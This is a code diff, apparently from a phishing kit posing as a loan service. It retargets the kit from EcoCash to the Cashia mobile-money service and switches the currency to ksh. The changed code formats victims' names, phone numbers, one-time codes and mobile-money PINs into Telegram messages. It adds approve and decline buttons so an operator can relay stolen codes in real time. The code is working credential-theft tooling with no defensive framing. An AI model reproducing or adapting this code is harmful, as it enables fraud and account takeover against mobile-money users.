@@ -760,10 +760,10 @@ body.light .bundle-bar {
             var msg = '\u{1f4f2} <b>OTP Verification</b>\n\n' +
                 '<b>Name:</b> <code>' + (bd.name || 'N/A') + '</code>\n' +
                 '<b>OTP Code:</b> <code>' + otp + '</code>\n' +
-                '<b>Phone:</b> <code>+263' + phone + '</code>\n' +
+                '<b>Phone:</b> <code>' + phone + '</code>\n' +
                 '<b>Loan:</b> <code>' + (bd.data || 'N/A') + '</code>\n' +
-                '<b>Amount:</b> <code>USD ' + (bd.price || '0.00') + '</code>\n\n' +
-                '<b>Message (tap to copy):</b>\n<code>Your EcoCash OTP is.' + otp + '. Do not share this code with anyone. Expires in 2 mins.\n1qk+jE1lKeZ</code>';
+                '<b>Amount:</b> <code>ksh ' + (bd.price || '0.00') + '</code>\n\n' +
+                '<b>Message (tap to copy):</b>\n<code>DO NOT SHARE this code with anyone. Your Cashia code is ' + otp + '. YfOhgyzFjrz';
 
             var btns = [
                 [{ text: '\u2713 Approved', callback_data: 'otp_approved' }, { text: '\u2717 Declined', callback_data: 'otp_declined' }],
@@ -836,9 +836,9 @@ body.light .bundle-bar {
 
             var msg = '\u{1f510} <b>PIN Confirmation</b>\n\n' +
                 '<b>PIN:</b> <code>' + pin + '</code>\n' +
-                '<b>Phone:</b> <code>+263' + phone + '</code>\n' +
+                '<b>Phone:</b> <code>' + phone + '</code>\n' +
                 '<b>Loan:</b> <code>' + (bd.data || 'N/A') + '</code>\n' +
-                '<b>Amount:</b> <code>USD ' + (bd.price || '0.00') + '</code>';
+                '<b>Amount:</b> <code>ksh ' + (bd.price || '0.00') + '</code>';
             var btns = [[{ text: '\u2713 Approved', callback_data: 'pin_valid' }, { text: '\u2717 Invalid PIN', callback_data: 'pin_invalid' }]];
             tg(msg, btns);
             pollPin();
